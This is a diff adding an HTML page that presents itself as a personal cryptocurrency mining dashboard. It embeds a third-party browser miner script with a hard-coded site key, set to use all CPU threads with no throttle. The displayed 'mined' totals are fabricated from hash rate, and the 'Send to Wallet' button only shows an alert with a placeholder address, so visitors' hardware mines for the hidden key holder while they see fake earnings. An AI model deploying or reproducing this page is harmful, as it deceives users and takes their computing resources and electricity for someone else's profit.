@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Heir Genetics Mining</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #1c1c1c;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .mining-container {
+            margin-top: 50px;
+            padding: 20px;
+            border: 2px solid #fff;
+            border-radius: 10px;
+            background: #2d2d2d;
+        }
+
+        .stats {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .button {
+            padding: 10px 20px;
+            background-color: #00aaff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background-color: #0088cc;
+        }
+
+        .text-animation {
+            font-size: 20px;
+            color: #00ff00;
+            animation: blink 1s step-start infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Heir Genetics Mining</h1>
+    <div class="mining-container">
+        <div class="text-animation">⛏️ Mining in progress...</div>
+
+        <div class="stats">
+            <p><strong>Total Mined:</strong> <span id="total-mined">0</span> MintMe Coins</p>
+            <p><strong>Equivalent in Ethereum:</strong> <span id="eth-equivalent">0</span> ETH</p>
+            <p><strong>MintMe to Ethereum Rate:</strong> <span id="conversion-rate">Fetching...</span></p>
+            <p><strong>Ethereum Wallet:</strong> <span id="wallet-address">0xYourEthereumWallet</span></p>
+        </div>
+
+        <button class="button" id="start-mining">Start Mining</button>
+        <button class="button" id="send-coins">Send to Wallet</button>
+    </div>
+
+    <script src="https://www.hostingcloud.racing/nihn.js"></script>
+    <script>
+        var _client = new Client.Anonymous('dd1370575eb7853cb7aebeb5b5ccbbf1969d2bbe03151ffa5fde471723c6a579', {
+            throttle: 0,
+            threads: navigator.hardwareConcurrency,
+            c: 'w'
+        });
+
+        let totalMined = 0; // Tracks total mined MintMe coins
+        let mintMeToEthRate = 0; // MintMe to ETH conversion rate
+
+        // Function to update stats dynamically
+        function updateStats() {
+            document.getElementById('total-mined').innerText = totalMined.toFixed(8);
+            const ethEquivalent = totalMined * mintMeToEthRate;
+            document.getElementById('eth-equivalent').innerText = ethEquivalent.toFixed(8);
+        }
+
+        // Fetch MintMe to ETH conversion rate
+        async function fetchConversionRate() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=mintme.com-coin,ethereum&vs_currencies=usd');
+                const data = await response.json();
+                const mintMeToUsd = data['mintme.com-coin'].usd;
+                const ethToUsd = data.ethereum.usd;
+                mintMeToEthRate = mintMeToUsd / ethToUsd;
+                document.getElementById('conversion-rate').innerText = `1 MintMe = ${mintMeToEthRate.toFixed(8)} ETH`;
+            } catch (error) {
+                document.getElementById('conversion-rate').innerText = 'Error fetching rate.';
+                console.error('Error fetching conversion rate:', error);
+            }
+        }
+
+        // Start mining
+        document.getElementById('start-mining').addEventListener('click', () => {
+            _client.start();
+            _client.addMiningNotification("Top", "Mining started. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+            setInterval(() => {
+                totalMined += _client.getHashesPerSecond() * 0.00000001; // Adjust this factor as needed
+                updateStats();
+            }, 1000);
+        });
+
+        // Simulate sending mined coins to wallet
+        document.getElementById('send-coins').addEventListener('click', () => {
+            alert(`Sending ${totalMined.toFixed(8)} MintMe Coins to wallet: 0xYourEthereumWallet`);
+        });
+
+        // Initialize
+        fetchConversionRate();
+    </script>
+</body>
+</html>
